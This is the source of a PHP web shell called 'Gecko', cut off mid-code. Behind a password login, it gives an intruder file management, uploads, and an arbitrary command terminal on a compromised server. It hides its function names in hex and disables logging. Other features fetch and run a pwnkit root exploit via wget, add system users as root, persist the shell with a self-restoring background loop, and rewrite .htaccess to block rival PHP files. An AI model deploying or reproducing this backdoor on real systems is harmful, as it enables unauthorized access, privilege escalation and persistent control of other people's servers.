<?php
session_start();
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

$password = "dfce3d41d1f2336c00fd2cf8cd850a24"; // Ms. Naga
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';
date_default_timezone_set("Asia/Jakarta");
function login_shell()
{
?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: cursive;
				background-image:url(https://gacorin.pro/naga.jpg);
            }

            input[type="password"] {
                border: none;
                border-bottom: 0px solid black;
                padding: 2px;
				background:#f0f8ff00;
            }

            input[type="password"]:focus {
                outline: none;
            }

            input[type="submit"] {
                border-color: #000000;
                padding: 4.5px 20px;
                background-color: #ca0303;
                color: #FFF;
            }
        </style>
    </head>

    <body>
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass">&nbsp;<input type="submit" name="submit" value="Rawrr">
            </div>
        </form>
    </body>
    </html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
# function WAF

$Array = [
    '676574637764', # getcwd => 0
    '676c6f62', # glob => 1
    '69735f646972', # is_dir => 2
    '69735f66696c65', # is_file => 3
    '69735f7772697461626c65', # is_writeable => 4
    '69735f7265616461626c65', # is_readble => 5
    '66696c657065726d73', # fileperms => 6
    '66696c65', # file => 7
    '7068705f756e616d65', # php_uname => 8
    '6765745f63757272656e745f75736572', # getcurrentuser => 9
    '68746d6c7370656369616c6368617273', # htmlspecial => 10
    '66696c655f6765745f636f6e74656e7473', # file_get_contents => 11
    '6d6b646972', # mkdir => 12
    '746f756368', # touch => 13
    '6368646972', # chdir => 14
    '72656e616d65', # rename => 15
    '65786563', # exec => 16
    '7061737374687275', # passthru => 17
    '73797374656d', # system => 18
    '7368656c6c5f65786563', # shell_exec => 19
    '706f70656e', # popen => 20
    '70636c6f7365', # pclose => 21
    '73747265616d5f6765745f636f6e74656e7473', # streamgetcontents => 22
    '70726f635f6f70656e', # proc_open => 23
    '756e6c696e6b', # unlink => 24
    '726d646972', # rmdir => 25
    '666f70656e', # fopen => 26
    '66636c6f7365', # fclose => 27
    '66696c655f7075745f636f6e74656e7473', # file_put_contents => 28
    '6d6f76655f75706c6f616465645f66696c65', # move_uploaded_file => 29
    '63686d6f64', # chmod => 30
    '7379735f6765745f74656d705f646972', # temp_dir => 31
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src='https://kit.fontawesome.com/057b9b510c.js' crossorigin='anonymous'></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <style>
        body {
            background-color: #0e0f17;
            color: #FFF;
            font-family: monospace;
        }

        ul {
            list-style: none;
        }

        .menu-header li {
            padding: 5px 0;
        }

        .menu-header ul li {
            font-weight: bold;
            font-style: italic;
        }

        .btn-submit {
            padding: 7px 25px;
            text-decoration: none;
            border: 2px solid grey;
            border-radius: 4px;
            background-color: #22242d;
            color: #FFF;
        }

        .btn-submit:hover {
            border: 2px solid #c5c8d6;
            background-color: #2e313d;
        }

        .form-upload {
            margin: 10px 0;
        }

        .form-file {
            background-color: #22242d;
            border: 2px solid grey;
            padding: 5px 20px;
            color: #c5c8d6;
            border-radius: 4px;
        }

        .menu-tools li {
            display: inline-block;
            margin: 15px 0;

        }

        .menu-file-manager {
            margin: 10px 40px;
        }

        .menu-file-manager ul {
            background-color: #2e313d;
        }

        .menu-file-manager li {
            display: inline-block;
            margin: 15px 20px;
        }

        .menu-file-manager li a::after {
            content: "";
            display: block;
            border-bottom: 1px solid #FFF;
        }

        .path-pwd {
            background-color: #2e313d;
            padding: 15px 0px;
            margin: 5px 0;
        }

        a {
            text-decoration: none;
            color: white;
        }

        a:hover {
            color: #c5c8d6;
        }

        table {
            border-radius: 5px;
        }

        thead {
            background-color: #2e313d;
            height: 35px;
        }

        tbody tr td {
            padding: 10px 0;
        }

        tbody tr td:nth-child(2),
        tbody tr td:nth-child(3),
        tbody tr td:nth-child(4) {
            text-align: center;
        }


        tbody tr:nth-child(even) {
            background-color: #22242d;
        }

        ::-webkit-scrollbar {
            width: 16px;
        }

        ::-webkit-scrollbar-track {
            background: #0e0f17;
        }

        ::-webkit-scrollbar-thumb {
            background: #22242d;
            border: 2px solid #555;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #555;
        }

        .modal {
            display: none;
            z-index: 2;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0, 0, 0, 0.3);
        }

        .modal-container {
            animation-name: modal-pop-out;
            animation-duration: 0.7s;
            animation-fill-mode: both;
            margin: auto;
            border-radius: 10px;
            margin-top: 10%;
            width: 800px;
            background-color: #f4f4f9;
        }

        @keyframes modal-pop-out {
            from {
                opacity: 0;
            }

            to {
                opacity: 1;
            }
        }

        .modal-header {
            color: black;
            margin-left: 30px;
            padding: 10px;
        }

        .modal-body {
            color: black;
        }

        .modal-create-input {
            width: 700px;
            padding: 10px 5px;
            background-color: #f4f4f9;
            margin: 0 5%;
            border: none;
            border-radius: 4px;
            box-shadow: 8px 8px 20px rgba(0, 0, 0, 0.2);
            border-bottom: 2px solid #0e0f17;
        }

        .box-shadow {
            box-shadow: 8px 8px 8px rgba(0, 0, 0, 0.2);
        }

        .btn-modal-close {
            background-color: #22242d;
            color: #FFF;
            border: none;
            border-radius: 4px;
            padding: 8px 35px;
        }

        .btn-modal-close:hover {
            background-color: #2e313d;
        }

        .modal-btn-form {
            margin: 15px 0;
            padding: 10px;
            text-align: right;
        }

        .file-size {
            color: orange;
        }

        .badge-root::after {
            content: "root";
            display: block;
            position: absolute;
            width: 40px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            border-radius: 4px;
            background-color: red;
        }

        .badge-windows::after {
            content: "windows";
            display: block;
            position: absolute;
            width: 60px;
            text-align: center;
            margin-top: -30px;
            margin-left: 100px;
            border-radius: 4px;
            background-color: red;
        }

        .badge-action-editor:hover::after {
            display: block;
            content: "Rename";
            position: absolute;
            width: 60px;
            padding: 5px;
            border-radius: 5px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            background-color: #2e313d;
        }

        .badge-action-chmod:hover::after {
            display: block;
            content: "Chmod";
            position: absolute;
            width: 60px;
            padding: 5px;
            border-radius: 5px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            background-color: #2e313d;
        }

        .badge-action-download:hover::after {
            display: block;
            content: "Download";
            position: absolute;
            width: 60px;
            padding: 5px;
            border-radius: 5px;
            text-align: center;
            margin-top: -30px;
            margin-left: 110px;
            background-color: #2e313d;
        }

        .code-editor {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.3);
            width: 100%;
        }

        .code-editor-container {
            background-color: #f4f4f9;
            color: black;
            width: 95%;
            /* height: 80%; */
            margin: auto;
            border-radius: 10px;
            margin-top: 40px;
        }

        .code-editor-head {
            padding: 15px;
            font-weight: bold;

        }

        .code-editor-body textarea {
            width: 98.5%;
            font-size: smaller;
            border-radius: 4px;
            margin: 0px 4px;
            height: 400px;
            background-color: #22242d;
            resize: none;
            color: #FFF;
        }

        .terminal {
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.3);
            width: 100%;
        }

        .terminal-container {
            animation: modal-pop-out;
            animation-duration: 0.5s;
            animation-fill-mode: both;
            width: 90%;
            background-color: #f4f4f9;
            margin: auto;
            margin-top: 25px;
            color: black;
            border-radius: 4px;
        }

        .terminal-head {
            padding: 8px;
        }

        .terminal-head li a {
            color: black;
            position: absolute;
            right: 0;
            margin-right: 110px;
            font-weight: bold;
            margin-top: -20px;
            font-size: 25px;
            padding: 1px 10px;
        }

        .terminal-head li {
            display: inline-block;
            color: black;
        }

        .terminal-body textarea {
            width: 98.5%;
            margin: 4px;
            resize: none;
            background-color: #22242d;
            color: #29db12;
            border-radius: 4px;
            height: 400px;
            font-size: smaller;
        }

        .active {
            display: block;
        }

        .terminal-body li {
            display: inline-block;
        }

        .terminal-input {
            width: 500px;
            background-color: #22242d;
            color: white;
            padding: 6px;
            border: 1px solid #22242d;
            border-radius: 4px;
            margin: 5px 0;
        }
    </style>
</head>

<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            <li><i class="fa-solid fa-globe"></i>&nbsp;<?= s(); ?></li>
            <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
            <form action="" method="post" enctype='<?= "\x6d\x75\x6c\x74\x69\x70\x61\x72\x74\x2f\x66\x6f\x72\x6d\x2d\x64\x61\x74\x61"; ?>'>
                <li class="form-upload"><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
            </form>
        </ul>
    </div>
    <div class="menu-tools">
        <ul>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal" class="btn-submit">Terminal</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=root" class="btn-submit badge-root">AUTO ROOT</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit">Adminer</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit">Backdoor Destroyer</a></li>
            <li><a href="https://www.exploit-db.com/search?q=Linux%20Kernel%20<?= suggest_exploit(); ?>" class="btn-submit">Linux Exploit</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit">Lock Shell</a></li>
            <li><a href="" class="btn-submit" id="lock-file">Lock File</a></li>
            <li><a href="" class="btn-submit badge-root" id="root-user">Create User</a></li>
            <li><a href="https://github.com/MadExploits/" class="btn-submit">README</a></li>
        </ul>
    </div>

    <?php

    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="menu-file-manager">
        <ul>
            <li><a href="" id="create_folder">+ Create Folder</a></li>
            <li><a href="" id="create_file">+ Create File</a></li>
        </ul>
        <div class="path-pwd">
            <?php
            $cwd = str_replace("\\", "/", $get_cwd); // untuk dir garis windows
            $pwd = explode("/", $cwd);
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '&nbsp;<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '">' . $val . ' / ' . '</a>';
            }
            echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME SHELL ]</a>";
            ?>
        </div>
        </ul>
        <table style="width: 100%;">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Permission</th>
                    <th>Action</th>
                </tr>
            </thead>
            <form action="" method="post">
                <tbody>
                    <!-- Gecko Folder File Manager -->
                    <?php foreach ($file_manager as $_D) : ?>
                        <?php if ($fungsi[2]($_D)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= $_D; ?></a></td>
                                <td>[ DIR ]</td>
                                <td>
                                    <?php if ($fungsi[4]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!$fungsi[5]($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_D);
                                    ?>
                                </td>
                                <!-- Action Folder Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                    <!-- Gecko Files Manager -->
                    <?php foreach ($file_manager as $_F) : ?>
                        <?php if ($fungsi[3]($_F)) : ?>
                            <tr>
                                <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<i class="fa-solid fa-file-lines"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= $_F; ?></a></td>
                                <td><?= formatSize(filesize($_F)); ?></td>
                                <td>
                                    <?php if (is_writable($fungsi[0]() . '/' . $_D)) {
                                        echo '<font color="#00ff00">';
                                    } elseif (!is_readable($fungsi[0]() . '/' . $_F)) {
                                        echo '<font color="red">';
                                    }
                                    echo perms($fungsi[0]() . '/' . $_F);
                                    ?>
                                </td>
                                <!-- Action File Manager -->
                                <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="badge-action-editor"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>" class="badge-action-chmod"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>" class="badge-action-download"><i class="fa-solid fa-download"></i></a></td>
                            </tr>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </tbody>
        </table>
        <br>
        <select name="gecko-select" class="btn-submit">
            <option value="delete">Delete</option>
            <option value="unzip">Unzip</option>
            <option value="zip">Zip</option><br>
        </select>
        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 8.3px 35px;">
        </form>

        <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
        <div class="modal">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">${this.title}</i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow" id="close-modal">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <?php if ($_GET['f']) : ?>
        <div class="code-editor">
            <div class="code-editor-container">
                <div class="code-editor-head">
                    <h3><i class="fa-solid fa-code"></i>&nbsp; Code Editor : <?= unx($_GET['f']); ?></h3>
                </div>
                <div class="code-editor-body">
                    <form action="" method="post">
                        <textarea name="code-editor" class="box-shadow" autofocus><?= $fungsi[10]($fungsi[11]($fungsi[0]() . "/" . unx($_GET['f']))); ?></textarea>
                        <div class="modal-btn-form">
                            <input type="submit" name="save-editor" value="Save" class="btn-modal-close">&nbsp;<button class="btn-modal-close" id="close-editor">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if (isset($_GET['terminal'])) : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;TERMINAL</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea class="box-shadow" disabled><?php
                                                            if (isset($_POST['terminal'])) {
                                                                echo $fungsi[10](cmd($_POST['terminal-text'] . " 2>&1"));
                                                            }
                                                            ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="terminal" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                <div class="terminal-head">
                    <ul>
                        <li id="terminal-title"><b><i class="fa-solid fa-terminal"></i>&nbsp;AUTO ROOT</b></li>
                        <li><a href="" class="close-terminal"><i class="fa-solid fa-right-from-bracket"></i></a></li>
                    </ul>
                </div>
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.mad-root');
                                                    $r_text = explode(" ", $response);
                                                    if ($r_text[0] == "uid=0(root)") {
                                                        if (isset($_POST['submit-root'])) {
                                                            echo cmd('./pwnkit "' . $_POST['root-terminal'] . '  2>&1"');
                                                        }
                                                    } else {
                                                        echo "This Device Is Not Vulnerable\n";
                                                        echo cmd('lsb_release -a') . "\n";
                                                        echo "Kernel Version : " . suggest_exploit() . "\n";
                                                    }
                                                } else {
                                                    $fungsi[24]('.mad-root');
                                                } ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]; ?>" autofocus></li>
                            <li><input type="submit" name="submit-root" value=">" class="btn-modal-close"></li>
                        </ul>
                    </form>
                </div>
            </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['re'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Rename : <?= unx($_GET['re']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="text" name="renameFile" class="modal-create-input" placeholder="Rename"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <?php if ($_GET['ch'] == true) : ?>
        <div class="modal active">
            <div class="modal-container">
                <div class="modal-header">
                    <h3><b><i id="modal-title">Change Permission : <?= unx($_GET['ch']) ?></i></b></h3>
                </div>
                <div class="modal-body">
                    <form action="" method="post">
                        <span id="modal-input"><input type="number" name="chFile" class="modal-create-input" placeholder="0775"></span>
                        <div class="modal-btn-form">
                            <input type="submit" name="submit" value="Submit" class="btn-modal-close box-shadow">&nbsp;<button class="btn-modal-close box-shadow close-btn-s">Close</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        </div>
    <?php endif; ?>
    <script>
        $(document).ready(function() {
            $('#create_folder').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i>&nbsp;Create Folder');
                $('#modal-input').html('<input type="text" name="create_folder" class="modal-create-input" placeholder="Create Folder">');
                event.preventDefault();
            });
            $('#create_file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i>&nbsp;Create File');
                $('#modal-input').html('<input type="text" name="create_file" class="modal-create-input" placeholder="Create File">');
                event.preventDefault();
            });
            $('#lock-file').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-lock"></i>&nbsp;Lock File');
                $('#modal-input').html('<input type="text" name="lockfile" class="modal-create-input" placeholder="Your File Name">');
                event.preventDefault();
            });
            $('#root-user').click(function() {
                $('.modal').show();
                $('#modal-title').html('<i class="fa-solid fa-user-plus"></i>&nbsp;ADD USER');
                $('#modal-input').html('<input type="text" name="add-username" class="modal-create-input" placeholder="Username"><br><br><input type="text" name="add-password" class="modal-create-input" placeholder="Password">');
                event.preventDefault();
            });

            $('#close-modal').click(function() {
                $('.modal').hide();
                event.preventDefault();
            });
            $('#close-editor').click(function() {
                $('.code-editor').hide();
                event.preventDefault();
            });

            $('.close-terminal').click(function() {
                $('.terminal').hide();
                event.preventDefault();
            });
            $('.close-btn-s').click(function() {
                $('.modal').hide();
                event.preventDefault();
            });
        });
    </script>
</body>

</html>
<?php


if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    $TmpNames = $fungsi[31]();
    if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler')) && file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'))) {
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
        cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-handler'));
    }
    mkdir($TmpNames . "/.sessions");
    cmd("cp $curFile " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text'));
    chmod($curFile, 0444);
    $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . __DIR__ . '")){
        mkdir("' . __DIR__ . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $curFile . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile) . '-text') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $curFile . '", base64_decode($text));
    }
    if (gecko_perm("' . $fungsi[0]() . '/' . $curFile . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $curFile . '", 0444);
    }
}

function gecko_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
    $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . "", $handler);
    if ($hndlers) {
        cmd('php ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($curFile)  . '-handler') . ' > /dev/null 2>/dev/null &');
    } else {
        failed();
    }
}
if (isset($_POST['gecko-up-submit'])) {
    $namaFilenya = $_FILES['gecko-upload']['name'];
    $tmpName = $_FILES['gecko-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
        success();
    } else {
        failed();
    }
}


if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
    if ($fungsi[4]($DOC_ROOT)) {
        $htaccess = '
<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
    Deny from all
</FilesMatch>
<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
    Allow from all
</FilesMatch>
<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
    Allow from all
</FilesMatch>';
        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
        if ($put_htt) {
            success();
        } else {
            failed();
        }
    } else {
        failed();
    }
}


if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) {
        success();
    } else {
        failed();
    }
}

if (isset($_GET['adminer'])) {
    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
    if (!$fungsi[3]('adminer.php')) {
        cmd('wget ' . $URL . ' -O adminer.php --quiet');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
    }
}


if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit')) {
        cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit id > .mad-root');
        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
    }
}

if (isset($_POST['submit-action'])) {
    $items = $_POST['check'];
    if ($_POST['gecko-select'] == "delete") {
        foreach ($items as $it) {
            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
            $fd = $repl . "/" . $it;
            if (is_dir($fd) || is_file($fd)) {
                $rmdir = unlinkDir($fd);
                $rmfile = $fungsi[24]($fd);
                if ($rmdir || $rmfile) {
                    success();
                } else {
                    failed();
                }
            }
        }
    }
}

if (isset($_POST['submit'])) {
    if ($_POST['create_folder'] == true) {
        $NamaFolder = $fungsi[12]($_POST['create_folder']);
        if ($NamaFolder) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['create_file'] == true) {
        $namaFile = $fungsi[13]($_POST['create_file']);
        if ($namaFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['renameFile'] == true) {
        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        if ($renameFile) {
            success();
        } else {
            failed();
        }
    } else if ($_POST['chFile']) {
        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        if ($chFiles) {
            success();
        } else {
            failed();
        }
    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .mad-root');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.mad-root')) {
            $response = $fungsi[11]('.mad-root');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
                $username = $_POST['add-username'];
                $password = $_POST['add-password'];
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
            } else {
                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
            }
        }
    } else if ($_POST['lockfile'] == true) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        if (file_exists($TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler'));
        }
        mkdir($TmpNames . "/.sessions");
        cmd("cp $flesName " . $TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file'));
        chmod($flesName, 0444);
        $handler = '
<?php
@ini_set("max_execution_time", 0);
while (True){
    if (!file_exists("' . $fungsi[0]() . '")){
        mkdir("' . $fungsi[0]() . '");
    }
    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
        $text = base64_encode(file_get_contents("' . $TmpNames . '/.sessions/.' . base64_encode($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", base64_decode($text));
    }
    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
    }
}

function gecko_perm($flename){
    return substr(sprintf("%o", fileperms($flename)), -4);
}
';
        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . base64_encode($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
        if ($hndlers) {
